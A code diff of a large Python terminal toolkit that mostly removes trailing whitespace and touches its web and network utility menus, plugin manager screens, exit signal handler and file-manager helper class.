    ├─ Incremental backups
    └─ Document restoration process
             """)
-            
+
             print(f"{BOLD}📊 Expected Results:{RESET}")
             print(f"  Storage saved: 30-50%")
             print(f"  Performance gain: 40-60%")
             print(f"  Organization time: 50% reduction")
             print(f"  Retrieval speed: 3-5x faster")
-            
+
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
 # --- WRAPPER: BACKWARD COMPATIBILITY ---
@@ -16175,7 +17394,7 @@ def feature_web_browser_center():
     import ssl
     import socket
     from urllib.parse import urlparse, urlencode, parse_qs
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🌐 Web Browser Center - Advanced Edition")
@@ -16184,43 +17403,43 @@ def feature_web_browser_center():
         print(f" [2] 📋 Fetch Page Headers")
         print(f" [3] 💾 Save Page to Log")
         print(f" [4] 🌍 Open in System Browser")
-        
+
         print(f"\n {BOLD}HTTP & API TESTING:{RESET}")
         print(f" [5] 🔧 HTTP Request Builder (GET/POST/PUT/DELETE/PATCH)")
         print(f" [6] 🔐 Test Authentication (Basic/Bearer/API Key)")
         print(f" [7] 📊 JSON Response Parser")
         print(f" [8] 🍪 Cookie Manager & Session Handler")
-        
+
         print(f"\n {BOLD}NETWORK & SECURITY:{RESET}")
         print(f" [9] 🔒 SSL Certificate Inspector")
         print(f" [10] 🎯 DNS Lookup & Resolution")
         print(f" [11] 🌐 Port Scanner (Common Ports)")
         print(f" [12] 🔗 URL Analyzer & Validator")
-        
+
         print(f"\n {BOLD}WEB SCRAPING & DATA:{RESET}")
         print(f" [13] 🕷️ Advanced Web Scraper (CSS/XPath)")
         print(f" [14] 📥 Bulk Download Manager")
         print(f" [15] 🗂️ Sitemap & Link Extractor")
         print(f" [16] 📱 User-Agent Switcher")
-        
+
         print(f"\n {BOLD}PERFORMANCE & MONITORING:{RESET}")
         print(f" [17] ⏱️ Page Load Performance Analyzer")
         print(f" [18] 🔍 HTTP Status Code Checker")
         print(f" [19] 📍 Redirect Chain Tracer")
         print(f" [20] 🛡️ Security Headers Audit")
-        
+
         print(f"\n {BOLD}UTILITIES:{RESET}")
         print(f" [21] 🔄 URL Encoder/Decoder")
         print(f" [22] 📑 HTML to Text Converter")
         print(f" [23] 🔎 Search Multiple Engines")
         print(f" [24] 📡 WHOIS & IP Lookup")
         print(f" [0] ↩️ Return")
-        
+
         choice = input(f"\n{BOLD}Select option: {RESET}").strip()
 
         if choice == '0':
             return
-        
+
         # Get URL for most operations
         if choice != '21' and choice != '22' and choice != '23':
             url = input(f"\n🌐 Enter URL [https://www.google.com]: ").strip() or "https://www.google.com"
@@ -16267,7 +17486,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
                 time.sleep(2)
-        
+
         elif choice == '2':  # Fetch Headers
             try:
                 res = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
@@ -16278,7 +17497,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '3':  # Save Page
             try:
                 res = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
@@ -16287,7 +17506,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '4':  # Open in Browser
             _open_url(url)
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
@@ -16297,18 +17516,18 @@ def feature_web_browser_center():
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔧 HTTP Request Builder")
             method = input("Method (GET/POST/PUT/DELETE/PATCH) [GET]: ").strip().upper() or "GET"
-            
+
             headers_str = input("Headers (JSON format) [{}]: ").strip() or "{}"
             try:
                 headers_dict = json.loads(headers_str) if headers_str != "{}" else {}
                 headers_dict['User-Agent'] = headers_dict.get('User-Agent', 'Mozilla/5.0')
             except:
                 headers_dict = {'User-Agent': 'Mozilla/5.0'}
-            
+
             body = ""
             if method in ['POST', 'PUT', 'PATCH']:
                 body = input("Body (JSON/Form) [{}]: ").strip() or "{}"
-            
+
             try:
                 if method == 'GET':
                     res = requests.get(url, headers=headers_dict, timeout=10)
@@ -16320,18 +17539,18 @@ def feature_web_browser_center():
                     res = requests.delete(url, headers=headers_dict, timeout=10)
                 elif method == 'PATCH':
                     res = requests.patch(url, data=body, headers=headers_dict, timeout=10)
-                
+
                 print(f"\n{COLORS['2'][0]}Status: {res.status_code}{RESET}\n")
                 print(f"{BOLD}Response (first 2000 chars):{RESET}\n{res.text[:2000]}")
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '6':  # Authentication Tester
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔐 Authentication Tester")
             auth_type = input("Auth Type (basic/bearer/apikey): ").strip().lower()
-            
+
             headers = {'User-Agent': 'Mozilla/5.0'}
             try:
                 if auth_type == 'basic':
@@ -16347,13 +17566,13 @@ def feature_web_browser_center():
                     key_value = input("Key Value: ").strip()
                     headers[key_name] = key_value
                     res = requests.get(url, headers=headers, timeout=10)
-                
+
                 print(f"\n{COLORS['2'][0]}Status: {res.status_code}{RESET}")
                 print(f"Auth: {'✅ Accepted' if res.status_code < 400 else '❌ Rejected'}")
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '7':  # JSON Parser
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📊 JSON Response Parser")
@@ -16364,7 +17583,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Not valid JSON or Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '8':  # Cookie Manager
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🍪 Cookie Manager")
@@ -16400,7 +17619,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '10':  # DNS Lookup
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🎯 DNS Lookup")
@@ -16412,7 +17631,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '11':  # Port Scanner
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌐 Port Scanner")
@@ -16427,7 +17646,7 @@ def feature_web_browser_center():
                 print(f"  Port {port}: {status}")
                 sock.close()
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '12':  # URL Analyzer
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔗 URL Analyzer")
@@ -16461,7 +17680,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '14':  # Bulk Download
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📥 Bulk Download Manager")
@@ -16471,10 +17690,10 @@ def feature_web_browser_center():
                 soup = BeautifulSoup(res.text, 'html.parser')
                 links = soup.select(selector)
                 from urllib.parse import urljoin
-                
+
                 download_dir = "downloads"
                 os.makedirs(download_dir, exist_ok=True)
-                
+
                 print(f"\n📥 Found {len(links)} files. Download? (y/n): ")
                 if input().lower() == 'y':
                     for i, link in enumerate(links[:10]):
@@ -16492,7 +17711,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '15':  # Sitemap & Links
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🗂️ Sitemap & Link Extractor")
@@ -16501,7 +17720,7 @@ def feature_web_browser_center():
                 soup = BeautifulSoup(res.text, 'html.parser')
                 links = soup.find_all('a', href=True)
                 from urllib.parse import urljoin
-                
+
                 internal = []
                 external = []
                 for link in links:
@@ -16511,7 +17730,7 @@ def feature_web_browser_center():
                         internal.append(href)
                     else:
                         external.append(href)
-                
+
                 print(f"\n🔗 Internal Links: {len(set(internal))}")
                 for link in list(set(internal))[:10]:
                     print(f"  {link[:80]}")
@@ -16521,7 +17740,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '16':  # User-Agent Switcher
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📱 User-Agent Switcher")
@@ -16540,7 +17759,7 @@ def feature_web_browser_center():
             ua = agents.get(ua_choice, agents['1'])
             if ua_choice == '6':
                 ua = input("Enter custom UA: ").strip()
-            
+
             try:
                 res = requests.get(url, headers={'User-Agent': ua}, timeout=10)
                 print(f"\nStatus: {res.status_code}")
@@ -16558,25 +17777,25 @@ def feature_web_browser_center():
                 start = time_module.time()
                 res = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
                 elapsed = time_module.time() - start
-                
+
                 print(f"\nURL: {url}")
                 print(f"Load Time: {elapsed:.2f}s")
                 print(f"Response Size: {len(res.content)} bytes")
                 print(f"Content-Type: {res.headers.get('Content-Type', 'N/A')}")
                 print(f"Encoding: {res.encoding}")
-                
+
                 speed = "🟢 Fast" if elapsed < 1 else "🟡 Normal" if elapsed < 3 else "🔴 Slow"
                 print(f"Speed: {speed}")
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '18':  # Status Code Checker
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔍 HTTP Status Code Checker")
             urls_str = input("URLs (comma-separated): ").strip()
             urls_list = [u.strip() for u in urls_str.split(',')]
-            
+
             print("\nChecking...")
             for test_url in urls_list:
                 if not test_url.startswith('http'):
@@ -16588,7 +17807,7 @@ def feature_web_browser_center():
                 except:
                     print(f"  {COLORS['1'][0]}{test_url}: ❌ Error{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '19':  # Redirect Tracer
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📍 Redirect Chain Tracer")
@@ -16602,7 +17821,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '20':  # Security Headers Audit
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🛡️ Security Headers Audit")
@@ -16639,7 +17858,7 @@ def feature_web_browser_center():
                 result = unquote(text)
                 print(f"\nDecoded: {result}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '22':  # HTML to Text
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📑 HTML to Text Converter")
@@ -16654,7 +17873,7 @@ def feature_web_browser_center():
             except Exception as e:
                 print(f"❌ Error: {e}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '23':  # Search Engines
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔎 Search Multiple Engines")
@@ -16672,7 +17891,7 @@ def feature_web_browser_center():
                     search_url = base_url + quote(query)
                     print(f"  {name}: {search_url}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '24':  # WHOIS & IP Lookup
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📡 WHOIS & IP Lookup")
@@ -16694,9 +17913,19 @@ def feature_process_search():
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("📑 Process Manager Sub-Menu")
-        print(f"📊 Sorting by: {BOLD}{sort_by.replace('_', ' ').upper()}{RESET}")
-        print(f"[1] 🔍 Search/List Once | [2] ⏱️ Live Monitor (2s Refresh) | [3] 🧠 Sort by Memory | [4] ⚙️ Sort by CPU | [5] ↩️ Return")
-        print(f"[6] 🧾 Process Details by PID | [7] 🛑 Terminate Process by PID")
+        print(f"📊 Sorting by: {BOLD}{sort_by.replace('_', ' ').upper()}{RESET}\n")
+
+        menu_options = [
+            "[1] 🔍 Search/List",
+            "[2] ⏱️ Live Monitor",
+            "[3] 🧠 Sort Memory",
+            "[4] ⚙️ Sort CPU",
+            "[5] ↩️ Return",
+            "[6] 🧾 Process Details",
+            "[7] 🛑 Terminate PID"
+        ]
+
+        print_menu_grid("", menu_options, cols=2, show_header=False)
 
         proc_choice = input("\n🎯 Select: ").strip()
 
@@ -20200,16 +21429,16 @@ def display_enhanced_plugin_menu():
     if not PluginManager:
         print(f"\n{COLORS['1'][0]}❌ Plugin system not available{RESET}")
         return
-    
+
     pm = get_plugin_manager()
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🔌 ENHANCED PLUGIN MANAGEMENT")
-        
+
         c = get_current_color()
         stats = pm.get_statistics()
-        
+
         print(f"\n{BOLD}{c}Plugin Management Options:{RESET}")
         print(f" {BOLD}[1]{RESET} 🔍 Discover Plugins")
         print(f" {BOLD}[2]{RESET} ✅ Validate Plugin")
@@ -20221,12 +21450,12 @@ def display_enhanced_plugin_menu():
         print(f" {BOLD}[8]{RESET} 📊 System Statistics")
         print(f" {BOLD}[9]{RESET} 📜 Event Log")
         print(f" {BOLD}[0]{RESET} ↩️  Return to Command Center")
-        
+
         print(f"\n{BOLD}{c}Current Status:{RESET}")
         print(f"  Discovered: {stats['total_discovered']}  Loaded: {stats['total_loaded']}")
-        
+
         choice = input(f"\n{BOLD}🎯 Select option: {RESET}").strip()
-        
+
         if choice == '0':
             break
         elif choice == '1':
@@ -20255,45 +21484,45 @@ def _discover_plugins(pm):
     """Discover all plugins."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔍 DISCOVER PLUGINS")
-    
+
     print(f"\n{BOLD}Scanning for plugins...{RESET}\n")
     discovered = pm.discover_plugins()
-    
+
     print(f"{COLORS['2'][0]}✅ Discovery complete{RESET}\n")
     print(f"Found {len(discovered)} plugins:\n")
-    
+
     for plugin_name in discovered:
         file_path, metadata = pm.discovered_plugins[plugin_name]
         print(f"  {COLORS['3'][0]}📦{RESET} {metadata.name:20} v{metadata.version:8} - {metadata.description[:40]}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _validate_plugin(pm):
     """Validate a plugin."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("✅ VALIDATE PLUGIN")
-    
+
     stats = pm.get_statistics()
     if not stats['plugins']:
         print(f"\n{COLORS['1'][0]}❌ No plugins discovered{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     print(f"\n{BOLD}Available plugins:{RESET}\n")
     for i, name in enumerate(stats['plugins'], 1):
         print(f" {BOLD}[{i}]{RESET} {name}")
-    
+
     choice = input(f"\n{BOLD}Select plugin number: {RESET}").strip()
-    
+
     try:
         idx = int(choice) - 1
         plugin_name = stats['plugins'][idx]
-        
+
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header(f"VALIDATING: {plugin_name}")
-        
+
         valid, msg = pm.validate_plugin(plugin_name)
-        
+
         if valid:
             print(f"\n{COLORS['2'][0]}✅ Plugin is valid{RESET}")
             info = pm.get_plugin_info(plugin_name)
@@ -20307,150 +21536,150 @@ def _validate_plugin(pm):
         else:
             print(f"\n{COLORS['1'][0]}❌ Validation failed{RESET}")
             print(f"  Error: {msg}")
-        
+
     except (ValueError, IndexError):
         print(f"\n{COLORS['1'][0]}Invalid selection{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _load_plugin(pm):
     """Load a plugin."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📦 LOAD PLUGIN")
-    
+
     stats = pm.get_statistics()
     available = [p for p in stats['plugins'] if p not in stats['loaded']]
-    
+
     if not available:
         print(f"\n{COLORS['3'][0]}ℹ️  All plugins are loaded{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     print(f"\n{BOLD}Available plugins to load:{RESET}\n")
     for i, name in enumerate(available, 1):
         print(f" {BOLD}[{i}]{RESET} {name}")
-    
+
     choice = input(f"\n{BOLD}Select plugin number: {RESET}").strip()
-    
+
     try:
         idx = int(choice) - 1
         plugin_name = available[idx]
-        
+
         sandbox = input(f"\n{BOLD}Load in sandbox? (y/n): {RESET}").strip().lower() == 'y'
-        
+
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header(f"LOADING: {plugin_name}")
-        
+
         success, msg = pm.load_plugin(plugin_name, sandboxed=sandbox)
-        
+
         if success:
             print(f"\n{COLORS['2'][0]}✅ {msg}{RESET}")
         else:
             print(f"\n{COLORS['1'][0]}❌ {msg}{RESET}")
-        
+
     except (ValueError, IndexError):
         print(f"\n{COLORS['1'][0]}Invalid selection{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _unload_plugin(pm):
     """Unload a plugin."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔓 UNLOAD PLUGIN")
-    
+
     stats = pm.get_statistics()
     if not stats['loaded']:
         print(f"\n{COLORS['3'][0]}ℹ️  No plugins loaded{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     print(f"\n{BOLD}Loaded plugins:{RESET}\n")
     for i, name in enumerate(stats['loaded'], 1):
         print(f" {BOLD}[{i}]{RESET} {name}")
-    
+
     choice = input(f"\n{BOLD}Select plugin number: {RESET}").strip()
-    
+
     try:
         idx = int(choice) - 1
         plugin_name = stats['loaded'][idx]
-        
+
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header(f"UNLOADING: {plugin_name}")
-        
+
         success, msg = pm.unload_plugin(plugin_name)
-        
+
         if success:
             print(f"\n{COLORS['2'][0]}✅ {msg}{RESET}")
         else:
             print(f"\n{COLORS['1'][0]}❌ {msg}{RESET}")
-        
+
     except (ValueError, IndexError):
         print(f"\n{COLORS['1'][0]}Invalid selection{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _call_plugin(pm):
     """Call a plugin function."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("⚙️  CALL PLUGIN FUNCTION")
-    
+
     stats = pm.get_statistics()
     if not stats['loaded']:
         print(f"\n{COLORS['3'][0]}ℹ️  No plugins loaded{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     print(f"\n{BOLD}Loaded plugins:{RESET}\n")
     for i, name in enumerate(stats['loaded'], 1):
         info = pm.get_plugin_info(name)
         entry_point = info.get('entry_point', 'run') if isinstance(info, dict) else 'run'
         print(f" {BOLD}[{i}]{RESET} {name}")
-    
+
     choice = input(f"\n{BOLD}Select plugin number: {RESET}").strip()
-    
+
     try:
         idx = int(choice) - 1
         plugin_name = stats['loaded'][idx]
-        
+
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header(f"CALLING: {plugin_name}")
-        
+
         result = pm.call_plugin(plugin_name)
         print(f"\n{COLORS['2'][0]}✅ Plugin executed successfully{RESET}")
-        
+
     except (ValueError, IndexError):
         print(f"\n{COLORS['1'][0]}Invalid selection{RESET}")
     except Exception as e:
         print(f"\n{COLORS['1'][0]}❌ Error: {str(e)}{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _show_plugin_info(pm):
     """Show plugin information."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📋 PLUGIN INFORMATION")
-    
+
     all_plugins = pm.get_all_plugins_info()
     if not all_plugins:
         print(f"\n{COLORS['3'][0]}ℹ️  No plugins found{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     print(f"\n{BOLD}All Plugins:{RESET}\n")
     for i, name in enumerate(all_plugins.keys(), 1):
         print(f" {BOLD}[{i}]{RESET} {name}")
-    
+
     choice = input(f"\n{BOLD}Select plugin number: {RESET}").strip()
-    
+
     try:
         idx = int(choice) - 1
         plugin_names = list(all_plugins.keys())
         plugin_name = plugin_names[idx]
         info = all_plugins[plugin_name]
-        
+
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header(f"PLUGIN: {plugin_name}")
-        
+
         print(f"\n{BOLD}Details:{RESET}")
         print(f"  Name:        {info.get('name', 'N/A')}")
         print(f"  Version:     {info.get('version', 'N/A')}")
@@ -20458,34 +21687,34 @@ def _show_plugin_info(pm):
         print(f"  Description: {info.get('description', 'N/A')}")
         print(f"  Status:      {info.get('status', 'N/A')}")
         print(f"  File:        {info.get('file_path', 'N/A')}")
-        
+
         if info.get('dependencies'):
             print(f"  Dependencies: {', '.join(info['dependencies'])}")
-        
+
         if info.get('loaded_at'):
             print(f"  Loaded at:   {info['loaded_at']}")
-        
+
         if info.get('checksum'):
             print(f"  Checksum:    {info['checksum'][:16]}...")
-        
+
     except (ValueError, IndexError):
         print(f"\n{COLORS['1'][0]}Invalid selection{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _show_dependencies(pm):
     """Show plugin dependencies."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔗 DEPENDENCIES")
-    
+
     stats = pm.get_statistics()
     if not stats['plugins']:
         print(f"\n{COLORS['3'][0]}ℹ️  No plugins found{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     print(f"\n{BOLD}Dependency Graph:{RESET}\n")
-    
+
     for plugin_name in stats['plugins']:
         deps = pm.get_dependencies_for(plugin_name)
         status = "✅" if plugin_name in stats['loaded'] else "⏸️ "
@@ -20496,31 +21725,31 @@ def _show_dependencies(pm):
                 print(f"    └─ {dep_status} {dep}")
         else:
             print(f"{status} {plugin_name}: (no dependencies)")
-    
+
     print(f"\n{BOLD}Load Order:{RESET}")
     load_order = pm.get_load_order()
     for i, plugin_name in enumerate(load_order, 1):
         print(f"  {i}. {plugin_name}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _show_statistics(pm):
     """Show plugin system statistics."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📊 PLUGIN STATISTICS")
-    
+
     stats = pm.get_statistics()
-    
+
     print(f"\n{BOLD}Overview:{RESET}")
     print(f"  Discovered Plugins: {stats['total_discovered']}")
     print(f"  Loaded Plugins:     {stats['total_loaded']}")
     print(f"  Total Events:       {stats['total_events']}")
-    
+
     print(f"\n{BOLD}Discovered:{RESET}")
     for name in stats['plugins']:
         status = "✅" if name in stats['loaded'] else "⏸️ "
         print(f"  {status} {name}")
-    
+
     print(f"\n{BOLD}System Health:{RESET}")
     success_count = 0
     error_count = 0
@@ -20529,24 +21758,24 @@ def _show_statistics(pm):
             success_count += 1
         elif event['status'] == 'error':
             error_count += 1
-    
+
     total = success_count + error_count
     if total > 0:
         success_rate = (success_count / total) * 100
         print(f"  Success Rate: {success_rate:.1f}%")
         print(f"  Successful: {success_count}  Failed: {error_count}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _show_event_log(pm):
     """Show plugin event log."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📜 EVENT LOG")
-    
+
     events = pm.get_event_log(count=50)
-    
+
     print(f"\n{BOLD}Recent Events (last 30):{RESET}\n")
-    
+
     if not events:
         print(f"{COLORS['3'][0]}No events yet{RESET}")
     else:
@@ -20557,9 +21786,9 @@ def _show_event_log(pm):
                 icon = f"{COLORS['1'][0]}❌"
             else:
                 icon = f"{COLORS['3'][0]}ℹ️ "
-            
+
             print(f"{icon}{RESET} [{event['timestamp']}] {event['type']:8} {event['plugin']:20} {event['message'][:50]}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def feature_plugin_center():
@@ -20568,7 +21797,7 @@ def feature_plugin_center():
     if PluginManager:
         display_enhanced_plugin_menu()
         return
-    
+
     # Fallback to legacy system
     load_plugins()
     print_header("🔌 Plugin Center (Legacy)")
@@ -22026,8 +23255,15 @@ try:
             pass
 
     def _asciip_exit_handler(sig, frame):
-        _asciip_reset_terminal()
-        _asciip_sys.exit(0)
+        """Exit handler that gracefully cleans up without raising exceptions during shutdown."""
+        try:
+            _asciip_reset_terminal()
+            # Restore default signal handler immediately to avoid recursion
+            _asciip_signal.signal(_asciip_signal.SIGINT, _asciip_signal.SIG_DFL)
+        except Exception:
+            pass
+        # Exit cleanly without raising exceptions that would interfere with thread shutdown
+        _asciip_os._exit(0)
 
     try:
         _asciip_signal.signal(_asciip_signal.SIGINT, _asciip_exit_handler)
@@ -23319,12 +24555,12 @@ def feature_curses_file_browser():
 # === FILE MANAGER AI OPTIMIZER ===
 class TextualFileManagerOptimizer:
     """AI-powered file management algorithms for advanced operations."""
-    
+
     def __init__(self):
         self.file_cache = {}
         self.recent_files = []
         self.max_cache = 1000
-    
+
     def calculate_directory_size(self, path):
         """Calculate total size of directory recursively."""
         try:
@@ -23338,17 +24574,17 @@ class TextualFileManagerOptimizer:
             return total
         except:
             return 0
-    
+
     def find_duplicate_files(self, path, by_content=False):
         """Find duplicate files by name or content hash."""
         import hashlib
         duplicates = {}
-        
+
         try:
             for dirpath, dirnames, filenames in os.walk(path):
                 for filename in filenames:
                     filepath = os.path.join(dirpath, filename)
-                    
+
                     if by_content:
                         try:
                             hash_obj = hashlib.md5()
@@ -23360,57 +24596,57 @@ class TextualFileManagerOptimizer:
                             continue
                     else:
                         key = filename
-                    
+
                     if key not in duplicates:
                         duplicates[key] = []
                     duplicates[key].append(filepath)
         except:
             pass
-        
+
         return {k: v for k, v in duplicates.items() if len(v) > 1}
-    
+
     def detect_file_encoding(self, filepath):
         """Detect file encoding (UTF-8, ASCII, Binary, etc)."""
         try:
             with open(filepath, 'rb') as f:
                 raw = f.read(10000)
-            
+
             # Check for BOM
             if raw.startswith(b'\xff\xfe') or raw.startswith(b'\xfe\xff'):
                 return 'UTF-16'
             if raw.startswith(b'\xef\xbb\xbf'):
                 return 'UTF-8-BOM'
-            
+
             # Try UTF-8
             try:
                 raw.decode('utf-8')
                 return 'UTF-8'
             except:
                 pass
-            
+
             # Try ASCII
             try:
                 raw.decode('ascii')
                 return 'ASCII'
             except:
                 pass
-            
+
             # Check for null bytes (binary)
             if b'\x00' in raw:
                 return 'BINARY'
-            
+
             return 'UNKNOWN'
         except:
             return 'ERROR'
-    
+
     def search_files(self, path, pattern, search_content=False):
         """Search for files by name or content."""
         import re
         results = []
-        
+
         try:
             regex = re.compile(pattern, re.IGNORECASE)
-            
+
             for dirpath, dirnames, filenames in os.walk(path):
                 for filename in filenames:
                     if regex.search(filename):
@@ -23425,13 +24661,13 @@ class TextualFileManagerOptimizer:
                             pass
         except:
             pass
-        
+
         return results
-    
+
     def estimate_file_type(self, filepath):
         """Estimate file type from extension and magic bytes."""
         ext = os.path.splitext(filepath)[1].lower()
-        
+
         type_map = {
             '.py': 'Python', '.js': 'JavaScript', '.ts': 'TypeScript',
             '.java': 'Java', '.cpp': 'C++', '.c': 'C', '.rs': 'Rust',
@@ -23444,21 +24680,21 @@ class TextualFileManagerOptimizer:
             '.mp3': 'Audio-MP3', '.wav': 'Audio-WAV', '.mp4': 'Video-MP4',
             '.pdf': 'Document-PDF', '.doc': 'Document-DOC', '.xls': 'Spreadsheet-XLS',
         }
-        
+
         return type_map.get(ext, f'File({ext})')
-    
+
     def batch_rename_files(self, files, pattern, replacement):
         """Batch rename files with pattern matching."""
         import re
         renamed = []
-        
+
         try:
             regex = re.compile(pattern)
             for filepath in files:
                 dirname = os.path.dirname(filepath)
                 oldname = os.path.basename(filepath)
                 newname = regex.sub(replacement, oldname)
-                
+
                 if oldname != newname:
                     newpath = os.path.join(dirname, newname)
                     try:
@@ -23468,13 +24704,13 @@ class TextualFileManagerOptimizer:
                         pass
         except:
             pass
-        
+
         return renamed
-    
+
     def calculate_disk_usage_by_type(self, path):
         """Calculate disk usage grouped by file type."""
         usage = {}
-        
+
         try:
             for dirpath, dirnames, filenames in os.walk(path):
                 for filename in filenames:
@@ -23487,7 +24723,7 @@ class TextualFileManagerOptimizer:
                         pass
         except:
             pass
-        
+
         return dict(sorted(usage.items(), key=lambda x: x[1], reverse=True))
 
 
@@ -23495,9 +24731,9 @@ def feature_enhanced_file_manager():
     """📁 Enhanced Textual File Manager - 600% Enhancement with 15+ Apps"""
     import json
     from pathlib import Path
-    
+
     optimizer = TextualFileManagerOptimizer()
-    
+
     def _option1_file_browser():
         """Option 1: Advanced File Browser"""
         print_header("📁 Advanced File Browser")
@@ -23509,10 +24745,10 @@ FEATURES:
   • Quick preview for text files
   • Permissions display
         """)
-        
+
         current_path = os.getcwd()
         print(f"\nCurrent directory: {current_path}\n")
-        
+
         try:
             entries = sorted(os.listdir(current_path))
             for i, entry in enumerate(entries[:20], 1):
@@ -23522,24 +24758,24 @@ FEATURES:
                 if os.path.isfile(full_path):
                     size = f" ({os.path.getsize(full_path):,} bytes)"
                 print(f"  {i:2}. {is_dir} {entry}{size}")
-            
+
             if len(entries) > 20:
                 print(f"\n  ... and {len(entries) - 20} more items")
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(2)
-    
+
     def _option2_duplicate_finder():
         """Option 2: Duplicate File Finder"""
         print_header("🔍 Duplicate File Finder")
         print("Searching for duplicate files...\n")
-        
+
         path = input("Enter path to search (default: current dir): ").strip() or os.getcwd()
         search_type = input("Search by [1] Name or [2] Content: ").strip()
-        
+
